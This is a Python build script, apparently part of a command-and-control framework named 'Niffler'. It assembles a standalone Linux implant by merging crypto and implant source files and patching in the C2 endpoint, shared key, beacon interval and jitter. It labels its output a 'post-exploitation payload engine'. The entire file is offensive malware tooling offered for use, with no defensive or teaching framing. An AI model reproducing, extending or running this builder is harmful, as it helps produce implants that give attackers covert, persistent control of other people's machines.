import os
import re
import yaml

def compile_implant(output_path: str = "dist/niffler_agent.py"):
    print("[*] Launching Niffler Automated Build Matrix...")
    
    server_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.dirname(server_dir)
    
    config_file = os.path.join(server_dir, "config.yaml")
    crypto_file = os.path.join(project_root, "common", "crypto_utils.py")
    implant_file = os.path.join(project_root, "implant", "implant.py")
    
    if not all(os.path.exists(f) for f in [config_file, crypto_file, implant_file]):
        print("[-] Build Error: Missing source core files or config.yaml.")
        return

    # 1. Parse configuration parameters
    with open(config_file, "r") as f:
        config = yaml.safe_load(f)
        
    print(f"[*] Compiling payload for target endpoint: {config.get('c2_endpoint')}")
    
    # 2. Read source code
    with open(crypto_file, "r") as f:
        crypto_code = f.read()
        
    with open(implant_file, "r") as f:
        implant_code = f.read()

    # 3. Strip internal project import structures
    implant_code = re.sub(r"sys\.path\.append\(.*?\)", "", implant_code)
    implant_code = re.sub(r"from common\.crypto_utils import.*", "", implant_code)

    # 4. Patch build-time tokens with configuration values
    implant_code = implant_code.replace("{{BUILD_SHARED_KEY}}", config.get("shared_key", ""))
    implant_code = implant_code.replace("{{BUILD_C2_ENDPOINT}}", config.get("c2_endpoint", ""))
    implant_code = implant_code.replace("{{BUILD_BEACON_INTERVAL}}", str(config.get("beacon_interval", 15)))
    implant_code = implant_code.replace("{{BUILD_JITTER}}", str(config.get("jitter", 3)))

    # 5. Assemble unified independent payload script
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    compiled_source = f"""# -*- coding: utf-8 -*-
# Automatically generated post-exploitation payload engine.
# Targets generic Linux environments with ZERO external pip dependencies.

{crypto_code}

# --- EXTRACTED CORE IMPLANT ENGINE ---
{implant_code}
"""
    compiled_source = compiled_source.replace("import crypto_utils", "")

    with open(output_path, "w") as f:
        f.write(compiled_source)
        
    print(f"[+] Build Success! Standalone payload compiled to: {output_path}")
    print(f"[+] File Size: {os.path.getsize(output_path) / 1024:.2f} KB")

if __name__ == "__main__":
    compile_implant()
